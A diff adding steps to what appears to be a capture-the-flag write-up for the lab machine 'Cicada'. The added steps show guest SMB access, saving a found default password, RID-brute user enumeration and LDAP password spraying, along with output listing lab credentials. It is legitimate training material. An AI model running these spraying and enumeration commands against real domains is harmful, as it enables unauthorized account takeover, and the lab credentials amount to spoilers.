@@ -74,7 +74,7 @@ SMB         10.10.11.35     445    CICADA-DC        SYSVOL                      
 
 Text file in the HR share
 ```bash
-smbclient -U 'wither' -p ''  \\\\10.10.11.35\\HR
+smbclient -U 'guest' -p ''  \\\\10.10.11.35\\HR
 
 Password for [WORKGROUP\wither]:
 Try "help" to get a list of possible commands.
@@ -101,7 +101,84 @@ Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 ...
 ```
 
+Save the password to a file
+```bash
+echo 'Cicada$M6Corpb*@Lp#nZp!8' > creds.txt
+```
 
+Enumerate users via RID cycling
+```bash
+nxc smb 'CICADA-DC' -u 'guest' -p '' --rid-brute | awk '{print $6}' | cut -d '\' -f2 > potential-users.txt
+```
+
+Sprayed the password I found earlier against the list of users to find a match against `michael.wrightson` as well as a password `aRt$Lp#7t*VQ!3` for `david.orelious` in his description.
+```bash
+nxc ldap 'CICADA-DC' -u potential-users.txt -p creds.txt --active-users 
+
+LDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Windows:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\guest::Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Domain:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Cert:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Schema:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Group:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Read-only:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Cloneable:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Protected:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Key:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Enterprise:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\RAS:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Allowed:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Denied:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\DnsAdmins:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\DnsUpdateProxy:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target?
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\Groups:Cicada$M6Corpb*@Lp#nZp!8 Error connecting to the domain, are you sure LDAP service is running on the target? 
+Error: [Errno 104] Connection reset by peer
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+LDAP        10.10.11.35     389    CICADA-DC        [*] Total records returned: 8, total 1 user(s) disabled
+LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 21:08:03 6        Built-in account for administering the computer/domain
+LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 18:26:56 0        Built-in account for guest access to the computer/domain
+LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 4        
+LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 4        
+LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
+LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 2        Just in case I forget my password is aRt$Lp#7t*VQ!3
+LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 22:20:17 2  
+```
 
 ## Enumeration
 
